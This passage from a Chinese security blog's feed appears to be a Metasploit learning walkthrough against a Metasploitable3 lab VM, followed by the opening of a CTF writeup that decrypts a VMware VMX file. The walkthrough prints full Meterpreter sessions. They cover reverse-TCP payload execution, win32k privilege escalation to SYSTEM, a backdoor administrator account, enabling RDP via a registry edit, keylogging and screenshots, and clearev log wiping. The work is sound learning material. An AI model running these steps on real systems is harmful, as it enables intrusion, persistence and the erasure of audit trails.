class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*</span><br><span class="line"> unless  Uploading file</span><br><span class="line">Upload succeeded: http://192.168.75.134:8585/uploads/2222.exe</span><br></pre></td></tr></table></figure></li><li><p>通过shell运行exe,执行漏洞exp,权限从SERVICE提升为SYSTEM</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session <span class="number">2.</span>..</span><br><span class="line">msf5 exploit(multi/handler) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                          Connection</span><br><span class="line">  --  ----  ----                     -----------                          ----------</span><br><span class="line">  <span class="number">2</span>         meterpreter php/windows  LOCAL SERVICE (<span class="number">0</span>) @ METASPLOITABLE3  <span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">1111</span> -&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>:<span class="number">54507</span> (<span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>)</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; windows/<span class="comment">meterpreter_reverse_tcp</span></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; show <span class="keyword">options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (exploit/<span class="comment">multi</span>/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload <span class="keyword">options</span> (windows/<span class="comment">meterpreter_reverse_tcp):</span></span><br><span class="line"></span><br><span class="line">   Name        <span class="comment">Current Setting  Required  Description</span></span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   EXITFUNC    <span class="comment">process          yes       Exit technique (Accepted:</span> <span class="comment">''</span><span class="comment">, seh, thread, process, none)</span></span><br><span class="line">   EXTENSIONS                   <span class="comment">no        Comma-separate list of extensions to load</span></span><br><span class="line">   EXTINIT                      <span class="comment">no        Initialization strings for extensions</span></span><br><span class="line">   LHOST       <span class="comment">192.168.75.128   yes       The listen address (an interface may be specified)</span></span><br><span class="line">   LPORT       <span class="comment">1111             yes       The listen port</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit <span class="comment">target:</span></span><br><span class="line"></span><br><span class="line">   Id  <span class="comment">Name</span></span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard <span class="comment">Target</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; set lport <span class="number">2222</span></span><br><span class="line">lport =&gt; <span class="number">2222</span></span><br><span class="line">msf5 exploit(multi/<span class="comment">handler) &gt; run -j -z</span></span><br><span class="line">[*] Exploit <span class="comment">running as background job 0.</span></span><br><span class="line">[*] Exploit <span class="comment">completed, but no session was created.</span></span><br><span class="line"></span><br><span class="line">[*] Started <span class="comment">reverse TCP handler on 192.168.75.128:2222</span> </span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                          Connection</span><br><span class="line">  --  ----  ----                     -----------                          ----------</span><br><span class="line">  <span class="number">2</span>         meterpreter php/<span class="comment">windows  LOCAL SERVICE (0) @ METASPLOITABLE3  192.168.75.128:1111 -&gt; 192.168.75.134:54507 (192.168.75.134)</span></span><br><span class="line"></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; sessions <span class="number">2</span></span><br><span class="line">[*] Starting interaction with <span class="number">2.</span>..</span><br><span class="line"></span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">C:\wamp\www\uploads</span><br><span class="line">meterpreter &gt; execute -f <span class="comment">"C:\\wamp\\www\\uploads\\2222.exe"</span></span><br><span class="line">Process <span class="number">6076</span> created.</span><br><span class="line">meterpreter &gt; [*] Meterpreter session <span class="number">3</span> opened (<span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">2222</span> -&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>:<span class="number">55448</span>) at <span class="number">2019</span><span class="number">-01</span><span class="number">-23</span> <span class="number">15</span>:<span class="number">55</span>:<span class="number">27</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session <span class="number">2.</span>..</span><br><span class="line">msf5 exploit(multi/<span class="comment">handler) &gt; sessions -l</span></span><br><span class="line"></span><br><span class="line">Active <span class="comment">sessions</span></span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  <span class="comment">Name  Type                     Information                                   Connection</span></span><br><span class="line">  --  ----  ----                     -----------                                   ----------</span><br><span class="line">  2         meterpreter <span class="comment">php</span>/windows  LOCAL SERVICE (<span class="number">0</span>) @ METASPLOITABLE3           <span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">1111</span> -&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>:<span class="number">54507</span> (<span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>)</span><br><span class="line">  <span class="number">3</span>         meterpreter x86/<span class="comment">windows  NT AUTHORITY\LOCAL SERVICE @ METASPLOITABLE3  192.168.75.128:2222 -&gt; 192.168.75.134:55448 (192.168.75.134)</span></span><br><span class="line"></span><br><span class="line">msf5 <span class="comment">exploit(multi</span>/handler) &gt; use exploit/<span class="comment">windows</span>/local/<span class="comment">ms18_8120_win32k_privesc</span></span><br><span class="line">msf5 <span class="comment">exploit(windows</span>/local/<span class="comment">ms18_8120_win32k_privesc) &gt; show options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="comment">options (exploit</span>/windows/<span class="comment">local</span>/ms18_8120_win32k_privesc):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   <span class="keyword">yes</span>       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/<span class="comment">local</span>/ms18_8120_win32k_privesc) &gt; set session <span class="number">3</span></span><br><span class="line">session =&gt; <span class="number">3</span></span><br><span class="line">msf5 exploit(windows/<span class="comment">local</span>/ms18_8120_win32k_privesc) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">4444</span> </span><br><span class="line">[+] Exploit finished, wait <span class="keyword">for</span> privileged payload execution to complete.</span><br><span class="line">[*] Sending stage (<span class="number">179779</span> bytes) to <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span></span><br><span class="line">[*] Meterpreter session <span class="number">4</span> opened (<span class="number">192.168</span><span class="number">.75</span><span class="number">.128</span>:<span class="number">4444</span> -&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.134</span>:<span class="number">55526</span>) at <span class="number">2019</span><span class="number">-01</span><span class="number">-23</span> <span class="number">15</span>:<span class="number">57</span>:<span class="number">19</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\<span class="keyword">SYSTEM</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="远程监控"><a href="#远程监控" class="headerlink" title="远程监控"></a>远程监控</h2><ol start="16"><li>可通过run vnc实现，也可以添加用户远程登陆<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; net user</span><br><span class="line">[-] Unknown command: net.</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 5892 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows [Version 6.1.7601]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;net user</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">User accounts <span class="keyword">for</span> \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            anakin_skywalker         artoo_detoo              </span><br><span class="line">ben_kenobi               boba_fett                c_three_pio              </span><br><span class="line">chewbacca                darth_vader              greedo                   </span><br><span class="line">Guest                    han_solo                 jabba_hutt               </span><br><span class="line">jarjar_binks             kylo_ren                 lando_calrissian         </span><br><span class="line">leia_organa              luke_skywalker           sshd                     </span><br><span class="line">sshd_server              vagrant                  </span><br><span class="line">The command completed with one <span class="keyword">or</span> more errors.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;net<span class="built_in"> user </span>xiaoming 123456 /add</span><br><span class="line">net<span class="built_in"> user </span>xiaoming 123456 /add</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;net localgroup administrators xiaoming /add</span><br><span class="line">net localgroup administrators xiaoming /add</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure></li></ol><ul><li>PS:开启3389端口:REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</li></ul><ol start="17"><li>用户成功添加xiaoming<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;net user</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">User accounts <span class="keyword">for</span> \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            anakin_skywalker         artoo_detoo              </span><br><span class="line">ben_kenobi               boba_fett                c_three_pio              </span><br><span class="line">chewbacca                darth_vader              greedo                   </span><br><span class="line">Guest                    han_solo                 jabba_hutt               </span><br><span class="line">jarjar_binks             kylo_ren                 lando_calrissian         </span><br><span class="line">leia_organa              luke_skywalker           sshd                     </span><br><span class="line">sshd_server              vagrant                  xiaoming                 </span><br><span class="line">The command completed with one <span class="keyword">or</span> more errors.</span><br></pre></td></tr></table></figure></li></ol><h2 id="简单后渗透尝试"><a href="#简单后渗透尝试" class="headerlink" title="简单后渗透尝试"></a>简单后渗透尝试</h2><ol start="18"><li><p>查看是否为虚拟机</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/checkvm</span><br><span class="line"></span><br><span class="line">[<span class="meta">*</span>] Checking <span class="keyword">if</span> METASPLOITABLE3 <span class="keyword">is</span> a Virtual Machine .....</span><br><span class="line">[<span class="meta">+</span>] This <span class="keyword">is</span> a VMware Virtual Machine</span><br></pre></td></tr></table></figure></li><li><p>用户是否在线</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; quser</span><br><span class="line">[-] Unknown command: quser.</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 5828 created.</span><br><span class="line">Channel 3 created.</span><br><span class="line">Microsoft Windows [Version 6.1.7601]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\wamp\bin\apache\Apache2.2.21&gt;quser</span><br><span class="line">quser</span><br><span class="line"> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME</span><br><span class="line"> vagrant              <span class="built_in"> console </span>            1  Active      none   1/22/2019 6:06 PM</span><br></pre></td></tr></table></figure></li><li><p>检查闲置多久</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; idletime</span><br><span class="line">User has been idle <span class="keyword">for</span>: 6 hours 20 mins 34 secs</span><br></pre></td></tr></table></figure></li><li><p>多次截图对比管理员是否有操作</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">screenshot</span></span><br><span class="line"><span class="built_in">Screenshot</span> saved <span class="keyword">to</span>: /root/KMcxOzFn.jpeg</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/KMcxOzFn.jpeg?raw=true" alt=""></p><ol start="22"><li>获取用户hash<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190123165519.png?raw=true" alt=""></li><li><p>键盘监控，不过没成功。。。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start</span><br><span class="line">Starting the keystroke<span class="built_in"> sniffer </span><span class="built_in">..</span>.</span><br><span class="line">meterpreter &gt; keyscan_dump</span><br><span class="line">Dumping captured keystrokes<span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; keyscan_stop</span><br><span class="line">Stopping the keystroke sniffer<span class="built_in">..</span>.</span><br></pre></td></tr></table></figure></li><li><p>还有很多骚操作日后尝试。。现在最重要就是清除痕迹(事件日志)</p></li></ol><blockquote><p>clearev</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;metasploit学习&quot;&gt;&lt;a href=&quot;#metasploit学习&quot; class=&quot;headerlink&quot; title=&quot;metasploit学习&quot;&gt;&lt;/a&gt;metasploit学习&lt;/h1&gt;&lt;h2 id=&quot;主机发现&quot;&gt;&lt;a href=&quot;#主机发现&quot; class=&quot;headerlink&quot; title=&quot;主机发现&quot;&gt;&lt;/a&gt;主机发现&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;测试靶机主要为192.168.114.29,攻击机为192.168.114.176&lt;/strong&gt;&lt;blockquote&gt;
&lt;p&gt;db_nmap -v -n -sn 192.168.114.0/24&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PCB2018部分Writeup</title>
    <link href="https://cy9nusg4rd3n.github.io/2018/12/05/PCB2018%E9%83%A8%E5%88%86Writeup/"/>
    <id>https://cy9nusg4rd3n.github.io/2018/12/05/PCB2018部分Writeup/</id>
    <published>2018-12-05T12:06:04.000Z</published>
    <updated>2018-12-05T12:07:33.894Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="hack1t-复现队里大佬的"><a href="#hack1t-复现队里大佬的" class="headerlink" title="hack1t(复现队里大佬的)"></a>hack1t(复现队里大佬的)</h2><a id="more"></a><ol><li>题目给了完整的VM虚拟机压缩包，文件都经过了加密，但给出了密码bibinb<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205184640.png?raw=true" alt=""></li><li>用密码登陆，发现无法直接登陆系统，还需要账号密码，简单的root等弱口令失败告终；在进入系统时进入GRUB进行恢复密码，发现根本没这个选项，一下子没了什么思路，开始面向搜索引擎</li><li>一番操作后大佬找这个<br><a href="https://github.com/RF3/VMwareVMX" target="_blank" rel="noopener">破解VMX配置</a><blockquote><p>可以通过配置CD-ROM的系统来加载这个文件</p></blockquote></li><li>首先解密一下这个”Ubuntu 64-bit.vmx”,然后输入密码bibinb</li><li>发现报错<blockquote><p>Error: File Ubuntu 64-bit.vmx is not a valid VMX file</p></blockquote></li><li>原来是main.py脚本有瑕疵(果然我是做不出来的，因为遇到这个我是直接放弃的)<br><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20181205190937.png?raw=true" alt=""></li><li>把N改成n就行,然后得到<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">Password:</span><br><span class="line">guestos = <span class="string">"ubuntu-64"</span></span><br><span class="line">virtualhw<span class="selector-class">.version</span> = <span class="string">"13"</span></span><br><span class="line">config<span class="selector-class">.version</span> = <span class="string">"8"</span></span><br><span class="line">numvcpus = <span class="string">"2"</span></span><br><span class="line">cpuid<span class="selector-class">.coresPerSocket</span> = <span class="string">"1"</span></span><br><span class="line">memsize = <span class="string">"2048"</span></span><br><span class="line">pciBridge0<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">pciBridge4<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">pciBridge4<span class="selector-class">.virtualDev</span> = <span class="string">"pcieRootPort"</span></span><br><span class="line">pciBridge4<span class="selector-class">.functions</span> = <span class="string">"8"</span></span><br><span class="line">pciBridge5<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">pciBridge5<span class="selector-class">.virtualDev</span> = <span class="string">"pcieRootPort"</span></span><br><span class="line">pciBridge5<span class="selector-class">.functions</span> = <span class="string">"8"</span></span><br><span class="line">pciBridge6<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">pciBridge6<span class="selector-class">.virtualDev</span> = <span class="string">"pcieRootPort"</span></span><br><span class="line">pciBridge6<span class="selector-class">.functions</span> = <span class="string">"8"</span></span><br><span class="line">pciBridge7<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">pciBridge7<span class="selector-class">.virtualDev</span> = <span class="string">"pcieRootPort"</span></span><br><span class="line">pciBridge7<span class="selector-class">.functions</span> = <span class="string">"8"</span></span><br><span class="line">vmci0<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">mks<span class="selector-class">.enable3d</span> = <span class="string">"true"</span></span><br><span class="line">scsi0:<span class="number">0</span><span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">scsi0:<span class="number">0</span><span class="selector-class">.deviceType</span> = <span class="string">"disk"</span></span><br><span class="line">scsi0:<span class="number">0</span><span class="selector-class">.fileName</span> = <span class="string">"Ubuntu 64-bit-disk1.vmdk"</span></span><br><span class="line">scsi0:<span class="number">0</span><span class="selector-class">.mode</span> = <span class="string">"persistent"</span></span><br><span class="line">scsi0<span class="selector-class">.virtualDev</span> = <span class="string">"lsilogic"</span></span><br><span class="line">scsi0<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">sata0<span class="selector-class">.present</span> = <span class="string">"TRUE"</span></span><br><span class="line">vmci0<span class="selector-class">.unrestricted</span> = <span class="string">"false"</span></span><br><span class="line">vcpu<span class="selector-class">.hotadd</span> = <span class="string">"true"</span></span><br><span class="line">mem<span class="selector-class">.hotadd</span> = <span class="string">"true"</span></span><br><span class="line">powerType<span class="selector-class">.powerOff</span> = <span class="string">"soft"</span></span><br><span class="line">powerType<span class="selector-class">.reset</span> = <span class="string">"soft"</span></span><br><span class="line">powerType<span class="selector-class">.suspend</span> = <span class="string">"soft"</span></span><br><span class="line">toolscripts<span class="selector-class">.afterpoweron</span> = <span class="string">"true"</span></span><br><span class="line">toolscripts<span class="selector-class">.afterresume</span> = <span class="string">"true"</span></span><br><span class="line">toolscripts<span class="selector-class">.beforepoweroff</span> = <span class="string">"true"</span></span><br><span class="line">toolscripts<span class="selector-class">.beforesuspend</span> = <span class="string">"true"</span></span><br><span class="line">tools<span class="selector-class">.syncTime</span> = <span class="string">"false"</span></span><br><span class="line">nvram = <span class="string">"Ubuntu 64-bit-file1.nvram"</span></span><br><span class="line">virtualHW<span class="selector-class">.productCompatibility</span> = <span class="string">"hosted"</span></span><br><span class="line">extendedConfigFile = <span class="string">"Ubuntu 64-bit.vmxf"</span></span><br><span class="line">dataFileKey = <span class="string">"type=key:cipher=AES-256:key=NHhuUIeIg1lhhNi7CvHXZysR+lrMxsNhJl7DO0SIuZ4%3d"</span></span><br><span class="line">cryptoState = <span class="string">"encrypted"</span></span><br><span class="line">isolation<span class="selector-class">.tools</span><span class="selector-class">.copy</span><span class="selector-class">.disable</span> = <span class="string">"TRUE"</span></span><br><span class="line">isolation<span class="selector-class">.tools</span><span class="selector-class">.dnd</span><span class="selector-class">.disable</span> = <span class="string">"TRUE"</span></span><br><span class="line">isolation<span class="selector-class">.tools</span><span class="selector-class">.paste</span><span class="selector-class">.disable</span> = <span class="string">"TRUE"</span></span><br><span class="line">policy<span class="selector-class">.vm</span><span class="selector-class">.mvmtid</span> = <span class="string">"52 b5 65 b9 89 e2 54 bf-e2 ee e6 99 1f 9d 2d 29"</span></span><br><span class="line">rollingTier0<span class="selector-class">.uid</span> = <span class="string">"1"</span></span><br><span class="line">rollingTier0<span class="selector-class">.interval</span> = <span class="string">"86400"</span></span><br><span class="line">rollingTier0<span class="selector-class">.maximum</span> = <span class="string">"1"</span></span><br><span class="line">rollingTier0<span class="selector-class">.clientFlags</span> = <span class="string">"8"</span></span><br><span class="line">rollingTier0<span class="selector-class">.displayName</span> = <span class="string">"自动保护快照"</span></span><br><span class="line">rollingTier1<span class="selector-class">.uid</span> = <span class="string">"2"</span></span><br><span class="line">rollingTier1<span class="selector-class">.interval</span> = <span class="string">"604800"</span></span><br><span class="line">rollingTier1<span class="selector-class">.baseTier</span> = <span class="string">"1"</span></span><br><span class="line">rollingTier1<span class="selector-class">.baseTierInterval</span> = <span class="string">"7"</span></span><br><span class="line">rollingTier1<span class="selector-class">.maximum</span> = <span class="string">"1"</span></span><br><span class="line">rollingTier1<span class="selector-class">.clientFlags</span> = <span class="string">"8"</span></span><br><span class="line">rollingTier1<span class="selector-class">.displayName</span> = <span class="string">"自动保护快照"</span></span><br><span class="line">rollingTier2<span class="selector-class">.uid</span> = <span class="string">"3"</span></span><br><span class="line">rollingTier2<span class="selector-class">.interval</span> = <span class="string">"2419200"</span></span><br><span class="line">rollingTier2<span class="selector-class">.baseTier</span> = <span class="string">"1"</span></span><br><span class="line">rollingTier2<span class="selector-class">.baseTierInterval</span> = <span class="string">"28"</span></span><br><span class="line">rollingTier2<span class="selector-class">.maximum</span> = <span class="string">"1"</span></span><br><span class="line">rollingTier2<span class="selector-class">.clientFlags</span> = <span class="string">"8"</span></span><br><span class="line">rollingTier2<span class="selector-class">.displayName</span> = <span class="string">"自动保护快照"</span></span><br><span class="line">snapshot<span class="selector-class">.numRollingTiers</span> = <span class="string">"3"</span></span><br><span class="line">floppy0<span class="selector-class">.present</span> = <span class="string">"FALSE"</span></span><br><span class="line">uuid<span class="selector-class">.bios</span> = <span class="string">"56 4d 93 ac e2 84 54 3c-79 fd be 1f 62 8c 5d 67"</span></span><br><span class="line">uuid<span class="selector-class">.location</span> = <span class="string">"56 4d 93 ac e2 84 54 3c-79 fd be 1f 62 8c 5d 67"</span></span><br><span class="line">migrate<span class="selector-class">.hostlog</span> = <span class="string">".\Ubuntu 64-bit-0dae80fb.hlog"</span></span><br><span class="line">scsi0:<span class="number">0</span><span class="selector-class">.redo</span> = <span class="string">""</span></span><br><span class="line">pciBridge0<span class="selector-class">.pciSlotNumber</span> = <span class="string">"17"</span></span><br><span class="line">pciBridge4<span class="selector-class">.pciSlotNumber</span> = <span class="string">"21"</span></span><br><span class="line">pciBridge5<span class="selector-class">.pciSlotNumber</span> = <span 